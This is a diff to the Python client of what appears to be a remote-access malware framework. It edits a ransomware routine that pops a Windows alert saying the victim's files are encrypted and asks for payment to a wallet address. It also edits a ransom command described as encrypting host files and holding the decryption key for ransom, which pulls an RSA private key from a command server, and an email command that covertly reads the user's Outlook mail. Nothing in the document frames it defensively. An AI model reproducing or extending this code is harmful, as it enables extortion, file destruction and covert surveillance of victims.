@@ -606,11 +606,17 @@ class Client(object):
 
     @staticmethod
     @config(account_id=None, api_key=None, api_secret=None, api_version=None, wallet_address=None, target_url=None)
-    def _ransom_payment(session_id):
+    def _ransom_payment(session_id=None):
         try:
-            return Client._get_windows_alert("Your personal files have been encrypted. Wallet Address: {} Session ID: {} To decrypt your files, click the link and follow the instructions using the above information: {}".format(Client._ransom_payment.wallet_address, session_id, target_url), "ALERT! Action Required")
+            if os.name is 'nt':
+                alert = Client._get_windows_alert("Your personal files have been encrypted. Wallet Address: {} Session ID: {} To decrypt your files, click the link and follow the instructions using the above information: {}".format(Client._ransom_payment.wallet_address, session_id, Client._ransom_payment.target_url), "ALERT! Action Required")
+                return "Launched a Windows Message Box with ransom payment information"
+            else:
+                return "{} does not yet support {} platform".format(Client._ransom_payment.func_name, sys.platform)
         except Exception as e:
-            Client.debug("{} error: {}".format(Client._ransom_payment.func_name, str(e)))
+            e = "{} error: {}".format(Client._ransom_payment.func_name, str(e)))
+            Client.debug(e)
+            return e
 
                 
     def _ransom_encrypt(self, args):
@@ -1931,20 +1937,24 @@ class Client(object):
 
 
     @config(platforms=['win32','darwin'], command=True, usage='email <option>')
-    def email(self, args):
+    def email(self, args=None):
         """
         access user's Outlook email in the background
         """       
-        mode, _, arg   = str(args).partition(' ')
         try:
             if not Outlook.installed():
                 return "Outlook application could not be found"
-            if not getattr(self, '_email'):
-                self._email = Outlook()
-            if not hasattr(self._email, mode):
-                return json.dumps(Outlook.help())
             else:
-                return getattr(self._email, mode)(arg)
+                if not isinstance(self._email, Outlook):
+                    self._email = Outlook()
+                elif not args:
+                    return json.dumps(Outlook.help())
+                else:
+                    mode, _, arg   = str(args).partition(' ')
+                    if not hasattr(self._email, mode):
+                        return json.dumps(Outlook.help())
+                    else:
+                        return getattr(self._email, mode)(arg) if arg else getattr(self._email, mode)()
         except Exception as e2:
             self.debug("{} error: {}".format(self.email.func_name, str(e2)))
 
@@ -1955,11 +1965,23 @@ class Client(object):
         encrypt host files and hold decryption key for ransom
         """
         try:
+            output = []
             if not args:
                 return self.ransom.usage
-
             cmd, _, action = str(args).partition(' ')
-            
+            if not Client._ransom_payment.session_id:
+                e0 = "{} error: {}".format(Client._ransom_payment.func_name, "no session ID")
+                Client.debug(e0)
+                output.append(e0)
+            if not Client._ransom_payment.target_url:
+                e1 = "{} error: {}".format(Client._ransom_payment.func_name, "no target URL")
+                Client.debug(e1)
+                output.append(e1)
+            if not Client._ransom_payment.wallet_address:
+                e2 = "{} error: {}".format(Client._ransom_payment.func_name, "no wallet address")
+                Client.debug(e2)
+                output.append(e2)
+
             if 'payment' in cmd:
                 return self._ransom_payment(self._session['id'])
             
@@ -1973,6 +1995,8 @@ class Client(object):
                         task     = self._server_recv()
                         data     = task.get('data')
                         self._session['private_key'] = RSA.importKey(data)
+                    if not self._ransom_payment.wallet_address:
+                        self._ransom_payment.wallet_address = self._ransom_wallet_address()
                     for task_id in self._results:
                         if 'ransom' in self._results[task_id]['task'] and path in ('/', self._results[task_id]['data']['file_path']):
                             self._tasks.put_nowait((self._ransom_decrypt, task_id))
